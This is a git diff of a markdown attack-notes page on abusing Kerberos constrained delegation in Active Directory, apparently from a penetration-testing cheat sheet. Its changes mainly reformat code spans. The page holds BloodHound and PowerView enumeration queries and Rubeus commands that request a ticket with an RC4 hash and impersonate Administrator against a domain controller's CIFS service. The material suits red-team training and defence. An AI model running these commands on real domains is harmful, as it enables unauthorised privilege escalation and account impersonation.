@@ -23,7 +23,6 @@ description: Various attack prototypes for Constrained Delegation Abuse
 	- **Service for User to Proxy (S4U2proxy)** - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by *msDS-AllowedToDelegateTo* attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.
 	![](Constrained1.png)
 - To perform the delegation, we ultimately need the TGT of the principal (**machine or user**) trusted for delegation. We can extract it from a machine (Rubeus dump) or request one using the NTLM / AES keys (Mimikatz `sekurlsa::ekeys` + Rubeus `asktgt`).
-> NOTE: Constrained delegation can be configured on user accounts as well as computer accounts.  Make sure you search for both.
 1. Enumerate users/computers with constrained Delegation
 	- In Bloodhound: 
 		- Users `MATCH (c:User), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p`
@@ -31,7 +30,8 @@ description: Various attack prototypes for Constrained Delegation Abuse
 	- In Powerview:
 		- Users: `Get-DomainUser –TrustedToAuth`
 		- Computers: `Get-DomainComputer –TrustedToAuth`
-	- Using ADModule enumerate both computers and users: `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`
+	- Using ADModule enumerate both computers and users: ```Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo```
+> NOTE: Constrained delegation can be configured on user accounts as well as computer accounts.  Make sure you search for both.
 
 ------------------------------------------------------
 
@@ -39,8 +39,8 @@ description: Various attack prototypes for Constrained Delegation Abuse
 
 ## Basic Constrained Delegation Exploitation
 
-1. To perform the delegation, we ultimately need the TGT of the principal (machine or user) trusted for delegation.  We can extract it from a machine (Rubeus `dump`) or request one using the NTLM / AES keys (Mimikatz `sekurlsa::ekey`s + Rubeus `asktgt)`: `.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E`
-2. Use `s4u2self` and `s4u2proxy` to impersonate the Target user delegated to the allowed SPN: `.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:cifs/dc /ptt`
+1. To perform the delegation, we ultimately need the TGT of the principal (machine or user) trusted for delegation.  We can extract it from a machine (Rubeus `dump`) or request one using the NTLM / AES keys (Mimikatz `sekurlsa::ekey`s + Rubeus `asktgt)`: ```.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E```
+2. Use `s4u2self` and `s4u2proxy` to impersonate the Target user delegated to the allowed SPN: ```.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:cifs/dc /ptt```
 
 ## Alternate Service Name Abuse
 
